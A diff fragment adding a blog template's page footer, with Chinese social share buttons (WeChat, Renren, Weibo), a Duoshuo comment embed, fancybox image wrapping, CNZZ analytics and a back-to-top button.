+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"xdxd"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1253479891'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1253479891' type='text/javascript'%3E%3C/script%3E"));</script>
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回頂部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
